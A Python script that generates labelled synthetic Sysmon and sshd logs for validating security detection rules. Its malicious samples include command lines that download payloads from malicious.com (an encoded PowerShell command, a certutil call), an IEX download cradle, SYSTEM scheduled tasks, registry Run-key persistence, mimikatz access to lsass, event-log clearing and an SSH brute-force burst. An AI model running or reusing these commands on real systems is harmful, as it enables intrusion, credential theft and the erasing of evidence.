"""Generate labeled synthetic logs for detection validation (seeded, reproducible).

Outputs (JSONL):
  data/sysmon.jsonl  - Sysmon-style process creation (EventID 1) + registry (EventID 13)
  data/sshd.jsonl    - Linux sshd auth events

Harness metadata on every event (stripped before "ingest"):
  _label: "benign" | "malicious"
  _rule:  list of rule names expected to fire (empty for benign)

Usage: venv/bin/python tools/synth_logs.py
"""
import json
import random
from datetime import datetime, timedelta
from pathlib import Path

random.seed(20261005)
BASE = Path(__file__).resolve().parent.parent
DATA = BASE / "data"
DATA.mkdir(exist_ok=True)
START = datetime(2026, 10, 5, 9, 0, 0)

_pid = 4000


def ts(mins: float) -> str:
    return (START + timedelta(minutes=mins)).isoformat(timespec="seconds") + "Z"


def next_pid() -> int:
    global _pid
    _pid += random.randint(1, 60)
    return _pid


def proc(image, parent, cmdline, mins, label="benign", rule=()):
    return {
        "EventID": 1,
        "UtcTime": ts(mins),
        "ProcessGuid": f"{{{random.getrandbits(128):032x}}}",
        "ProcessId": next_pid(),
        "Image": image,
        "CommandLine": cmdline,
        "ParentImage": parent,
        "User": "DESKTOP-LAB\\analyst",
        "_label": label,
        "_rule": list(rule),
    }


def reg(image, target, details, mins, label="benign", rule=()):
    return {
        "EventID": 13,
        "UtcTime": ts(mins),
        "EventType": "SetValue",
        "Image": image,
        "TargetObject": target,
        "Details": details,
        "_label": label,
        "_rule": list(rule),
    }


def proc_access(source_image, granted_access, mins, label="benign", rule=()):
    return {
        "EventID": 10,
        "UtcTime": ts(mins),
        "SourceImage": source_image,
        "TargetImage": r"C:\Windows\System32\lsass.exe",
        "GrantedAccess": granted_access,
        "_label": label,
        "_rule": list(rule),
    }


def ssh(event_type, ip, user, mins, label="benign", rule=()):
    return {
        "@timestamp": ts(mins),
        "EventType": event_type,
        "SourceIP": ip,
        "User": user,
        "Port": 22,
        "_label": label,
        "_rule": list(rule),
    }


sysmon, sshd = [], []

# ---------- benign process noise ----------
BENIGN_PROCS = [
    (r"C:\Windows\System32\svchost.exe", r"C:\Windows\System32\services.exe", "svchost.exe -k netsvcs -p"),
    (r"C:\Program Files\Google\Chrome\Application\chrome.exe", r"C:\Windows\explorer.exe", '"chrome.exe" --renderer-client-id=7'),
    (r"C:\Windows\System32\notepad.exe", r"C:\Windows\explorer.exe", '"notepad.exe" C:\\notes\\todo.txt'),
    (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", r"C:\Windows\explorer.exe",
     'powershell.exe -NoProfile -ExecutionPolicy RemoteSigned -File C:\\admin\\cleanup.ps1'),
    (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", r"C:\Windows\System32\svchost.exe",
     'powershell.exe -NoProfile -Command "Get-Service bits | Restart-Service"'),
    (r"C:\Program Files\Microsoft VS Code\Code.exe", r"C:\Windows\explorer.exe", '"Code.exe" C:\\lab\\detections'),
    (r"C:\Windows\System32\TiWorker.exe", r"C:\Windows\System32\svchost.exe", "TiWorker.exe -Embedding"),
    (r"C:\ProgramData\Microsoft\Windows Defender\Platform\MsMpEng.exe", r"C:\Windows\System32\services.exe", '"MsMpEng.exe"'),
    (r"C:\Windows\System32\conhost.exe", r"C:\Windows\System32\cmd.exe", r"\??\C:\Windows\system32\conhost.exe 0xffffffff"),
]
for i in range(560):
    img, par, cli = random.choice(BENIGN_PROCS)
    sysmon.append(proc(img, par, cli, random.uniform(0, 120)))

# ---------- malicious: encoded powershell (T1059.001) ----------
B64 = "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAGMAbwBtAC8AcAAuAHAAcwAxAA=="
ENC_VARIANTS = [
    f'powershell.exe -EncodedCommand {B64}',
    f'"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -enc {B64}',
    f'powershell.exe -e {B64}',
    f'powershell.exe -ENC {B64}',                      # casing probe
    f'pwsh.exe -EncodedCommand {B64}',
    f'C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -encodedcommand {B64}',
]
PARENTS = [r"C:\Windows\explorer.exe", r"C:\Windows\System32\wscript.exe", r"C:\Windows\explorer.exe"]
for i, cli in enumerate(ENC_VARIANTS * 2):  # 12 events
    sysmon.append(proc(
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" if "pwsh" not in cli else r"C:\Program Files\PowerShell\7\pwsh.exe",
        random.choice(PARENTS), cli, random.uniform(10, 110),
        label="malicious", rule=["powershell_encoded_command"],
    ))

# ---------- malicious: office app spawning shell ----------
OFFICE_ATTACKS = [
    (r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
     r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
     f'powershell.exe -w hidden -enc {B64}'),
    (r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE",
     r"C:\Windows\System32\cmd.exe", 'cmd.exe /c certutil -urlcache -split -f http://malicious.com/p.exe'),
    (r"C:\Program Files\Microsoft Office\root\Office16\POWERPNT.EXE",
     r"C:\Windows\System32\wscript.exe", 'wscript.exe C:\\Users\\analyst\\AppData\\Local\\Temp\\drop.js'),
    (r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
     r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
     'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient)"'),
]
for par, img, cli in OFFICE_ATTACKS:
    sysmon.append(proc(img, par, cli, random.uniform(20, 100),
                       label="malicious", rule=["office_app_spawning_shell"]))

# ---------- registry persistence (T1547.001) ----------
sysmon.append(reg(r"C:\Users\analyst\AppData\Roaming\updater.exe",
                  r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Updater",
                  r"C:\Users\analyst\AppData\Roaming\updater.exe", 45,
                  label="malicious", rule=["registry_run_key_persistence"]))
sysmon.append(reg(r"C:\Windows\Temp\svchost.exe",
                  r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\Clean",
                  r"C:\Windows\Temp\svchost.exe /silent", 78,
                  label="malicious", rule=["registry_run_key_persistence"]))
# benign allowlisted writers (must NOT fire)
sysmon.append(reg(r"C:\Users\analyst\AppData\Local\Microsoft\OneDrive\OneDriveSetup.exe",
                  r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\OneDriveSetup",
                  r"C:\Users\analyst\AppData\Local\Microsoft\OneDrive\OneDrive.exe", 12))
sysmon.append(reg(r"C:\Windows\System32\SecurityHealthSystray.exe",
                  r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SecurityHealth",
                  r"%windir%\system32\SecurityHealthSystray.exe", 15))

# ---------- scheduled tasks: benign vendor updaters (v1 false positives) ----------
sysmon.append(proc(r"C:\Windows\System32\schtasks.exe", r"C:\Windows\System32\svchost.exe",
                   'schtasks.exe /create /tn "GoogleUpdateTaskMachineUA" /tr "GoogleUpdate.exe /ua" /sc hourly', 22))
sysmon.append(proc(r"C:\Windows\System32\schtasks.exe", r"C:\Windows\System32\svchost.exe",
                   'schtasks.exe /create /tn "OneDrive Standalone Update Task" /tr OneDriveStandaloneUpdater.exe /sc daily', 35))
sysmon.append(proc(r"C:\Windows\System32\schtasks.exe", r"C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\armsvc.exe",
                   'schtasks.exe /create /tn "AdobeARM" /tr "AdobeARM.exe" /sc onlogon', 51))
# ---------- scheduled tasks: malicious (T1053.005) ----------
sysmon.append(proc(r"C:\Windows\System32\schtasks.exe", r"C:\Windows\System32\cmd.exe",
                   'schtasks.exe /create /tn "SysCheck" /tr "C:\\ProgramData\\sys\\svc.exe" /sc minute /mo 30 /ru SYSTEM', 66,
                   label="malicious", rule=["scheduled_task_creation"]))
sysmon.append(proc(r"C:\Windows\System32\schtasks.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                   'schtasks.exe /create /tn "Updater" /tr "C:\\Windows\\Temp\\evil.exe" /sc onlogon /ru SYSTEM', 88,
                   label="malicious", rule=["scheduled_task_creation"]))

# ---------- LSASS process access (T1003.001, EventID 10) ----------
sysmon.append(proc_access(r"C:\Tools\mimikatz.exe", "0x1010", 70,
                          label="malicious", rule=["lsass_process_access"]))
sysmon.append(proc_access(r"C:\Windows\Temp\procdump.exe", "0x1438", 92,
                          label="malicious", rule=["lsass_process_access"]))
sysmon.append(proc_access(r"C:\ProgramData\Microsoft\Windows Defender\Platform\MsMpEng.exe", "0x1400", 30))
sysmon.append(proc_access(r"C:\Windows\System32\taskmgr.exe", "0x1000", 55))

# ---------- event log clearing (T1070.001) ----------
sysmon.append(proc(r"C:\Windows\System32\wevtutil.exe", r"C:\Windows\System32\cmd.exe",
                   "wevtutil cl Security", 74, label="malicious", rule=["clear_event_logs"]))
sysmon.append(proc(r"C:\Windows\System32\wevtutil.exe", r"C:\Windows\System32\cmd.exe",
                   "wevtutil.exe cl System", 95, label="malicious", rule=["clear_event_logs"]))
sysmon.append(proc(r"C:\Windows\System32\wevtutil.exe", r"C:\Windows\System32\cmd.exe",
                   "wevtutil gl Security", 40))  # get-log: benign, must NOT fire

# ---------- sshd ----------
for i in range(320):
    sshd.append(ssh("Accepted password", f"10.0.0.{random.randint(2, 40)}",
                    random.choice(["analyst", "deploy", "admin"]), random.uniform(0, 120)))
for i in range(14):  # scattered single failures: benign
    sshd.append(ssh("Failed password", f"10.0.0.{random.randint(2, 40)}",
                    random.choice(["analyst", "root"]), random.uniform(0, 120)))
# brute force burst: 25 fails, one IP, 4 minutes -> must fire
for i in range(25):
    sshd.append(ssh("Failed password", "203.0.113.45", random.choice(["root", "admin"]),
                    60 + i * 0.16, label="malicious", rule=["ssh_brute_force"]))
# slow scan: 6 fails over 40 min -> must NOT fire (below threshold)
for i in range(6):
    sshd.append(ssh("Failed password", "198.51.100.23", "root", 20 + i * 8))

with open(DATA / "sysmon.jsonl", "w") as f:
    for e in sysmon:
        f.write(json.dumps(e) + "\n")
with open(DATA / "sshd.jsonl", "w") as f:
    for e in sshd:
        f.write(json.dumps(e) + "\n")

n_mal = sum(1 for e in sysmon + sshd if e["_label"] == "malicious")
print(f"Wrote {len(sysmon)} sysmon events, {len(sshd)} sshd events ({n_mal} malicious)")
